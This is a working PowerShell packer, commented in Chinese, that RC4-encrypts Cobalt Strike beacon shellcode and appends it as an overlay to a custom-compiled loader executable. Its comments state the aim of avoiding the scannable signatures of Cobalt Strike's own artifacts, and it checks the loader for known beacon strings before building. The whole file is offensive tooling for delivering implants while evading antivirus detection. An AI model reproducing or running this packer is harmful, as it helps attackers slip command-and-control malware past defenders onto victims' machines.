# cs_dev :: pack_payload.ps1  --  自研 Payload 打包器
# ==========================================================================
# 把任意 raw shellcode (CS 生成的 .bin / .raw) 加密后追加到加载器 exe 尾部,
# 产出一个 PE 结构完全正常的可执行文件。
#
# 与 CS 的 artifact 机制的本质区别:
#   CS   : payload 写进 .data 段内的 1024 个 'A' 锚点处, 留下一段可被扫描的
#          固定结构, 且预留在段内导致体积/零区异常
#   本方案: payload 以 RC4 加密形式追加在文件尾部 (overlay), 不占用任何节区,
#          PE 头、节表、体积比例全部保持正常
#
# 用法:
#   .\pack_payload.ps1 -InputFile beacon.bin
#   .\pack_payload.ps1 -InputFile beacon.bin -OutFile D:\out\loader.exe -Compress
#
# 密钥派生必须与 csdev_loader.c 中 run_payload() 的实现逐位一致, 改动其一
# 必须同步改动另一处, 否则载荷无法解密。
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)] [string] $InputFile,
    [string] $OutFile = '',
    [string] $Loader  = '',
    [string] $MinGw   = 'D:\mingw64\bin'
)

$ErrorActionPreference = 'Stop'
$DevDir  = Split-Path -Parent $PSScriptRoot
$PkDir   = Join-Path $DevDir 'kits\packer'
$BuildD  = Join-Path $DevDir 'build\packer'
New-Item -ItemType Directory -Force -Path $BuildD | Out-Null

if (-not (Test-Path $InputFile)) { throw "input not found: $InputFile" }
if (-not $Loader) { $Loader = Join-Path $BuildD 'csdev_loader.exe' }

# ---- 编译加载器 (若尚未构建) --------------------------------------------
if (-not (Test-Path $Loader)) {
    $gcc = Join-Path $MinGw 'gcc.exe'
    if (-not (Test-Path $gcc)) { throw "gcc not found: $gcc" }
    Write-Host "[*] 编译加载器 ..." -ForegroundColor Cyan
    $src = Join-Path $PkDir 'csdev_loader.c'
    & $gcc -O2 -s -fno-ident -mwindows -o $Loader $src 2>&1 | Out-Null
    if (-not (Test-Path $Loader)) { throw "loader build failed" }
}

# 加载器必须不含任何 CS 特征串, 这里做一次自检
$lb = [System.IO.File]::ReadAllBytes($Loader)
$lt = [System.Text.Encoding]::ASCII.GetString($lb)
foreach ($bad in @('ReflectiveLoader', 'beacon.dll', 'AAAAAAAAAAAAAAAA')) {
    if ($lt.Contains($bad)) { Write-Host "[-] 加载器含特征串: $bad" -ForegroundColor Red; exit 1 }
}
Write-Host ("[+] 加载器就绪  {0} 字节" -f $lb.Length) -ForegroundColor Green

# ---- 读取 payload -------------------------------------------------------
$payload = [System.IO.File]::ReadAllBytes((Resolve-Path $InputFile))
if ($payload.Length -eq 0) { throw "empty payload" }
$psize = $payload.Length
Write-Host ("[+] payload    {0} 字节" -f $psize)

# ---- 派生密钥 (与 loader 的 C 实现逐位一致) -----------------------------
# 尾部头布局必须与 csdev_loader.c 的 CSDEV_TAIL 完全一致: magic/size/checksum 共 12 字节
$MAGIC     = 0x4B504443                    # 'CDPK' 小端
$HDRLEN    = 12
$lsize     = $lb.Length
$finalSize = $lsize + $psize + $HDRLEN
$cs        = Get-Random -Minimum 0x10000000 -Maximum 0x7FFFFFFF

$key = New-Object byte[] 16
for ($i = 0; $i -lt 16; $i++) {
    $sh = ($i % 4) * 8
    $a  = ([uint64]$finalSize) -shr $sh
    $b  = ([uint64]$cs)        -shr $sh
    $v  = ($a -bxor $b -bxor ($i * 0x5B + 0x37)) -band 0xFF
    $key[$i] = [byte]$v
}

# ---- RC4 (自反运算, 与 loader 中 rc4() 等价) ----------------------------
$s = New-Object byte[] 256
for ($i = 0; $i -lt 256; $i++) { $s[$i] = [byte]$i }
$j = 0
for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $s[$i] + $key[$i % 16]) -band 0xFF
    $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t
}
$enc = New-Object byte[] $psize
$i = 0; $j = 0
for ($n = 0; $n -lt $psize; $n++) {
    $i = ($i + 1) -band 0xFF
    $j = ($j + $s[$i]) -band 0xFF
    $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t
    $k = $s[($s[$i] + $s[$j]) -band 0xFF]
    $enc[$n] = [byte]($payload[$n] -bxor $k)
}

# ---- 组装输出 -----------------------------------------------------------
if (-not $OutFile) {
    $OutFile = Join-Path $BuildD ((Get-Item $InputFile).BaseName + '_packed.exe')
}
$outDir = Split-Path -Parent $OutFile
if ($outDir) { New-Item -ItemType Directory -Force -Path $outDir | Out-Null }

$ms = New-Object System.IO.MemoryStream
$ms.Write($lb, 0, $lb.Length)
$ms.Write($enc, 0, $enc.Length)
$hdr = New-Object byte[] $HDRLEN
[Array]::Copy([BitConverter]::GetBytes([uint32]$MAGIC), 0, $hdr, 0, 4)
[Array]::Copy([BitConverter]::GetBytes([uint32]$psize), 0, $hdr, 4, 4)
[Array]::Copy([BitConverter]::GetBytes([uint32]$cs),    0, $hdr, 8, 4)
$ms.Write($hdr, 0, $HDRLEN)
[System.IO.File]::WriteAllBytes($OutFile, $ms.ToArray())
$ms.Dispose()

$fin = Get-Item $OutFile
Write-Host ""
Write-Host "[+] 打包完成" -ForegroundColor Green
Write-Host ("    path      : {0}" -f $fin.FullName)
Write-Host ("    size      : {0} 字节  (加载器 {1} + payload {2} + 头 {3})" -f $fin.Length, $lsize, $psize, $HDRLEN)
Write-Host ("    overlay   : {0} 字节 (占总体积 {1}%)" -f ($psize + $HDRLEN), [math]::Round(($psize + $HDRLEN) * 100 / $fin.Length, 1))
Write-Host ("    加密      : RC4, 密钥由文件大小与校验值派生, 静态不可见")
Write-Host ("    自检      : 最终大小 {0} 与派生所用值 {1} {2}" -f $fin.Length, $finalSize, $(if($fin.Length -eq $finalSize){'一致 OK'}else{'不一致!'}))
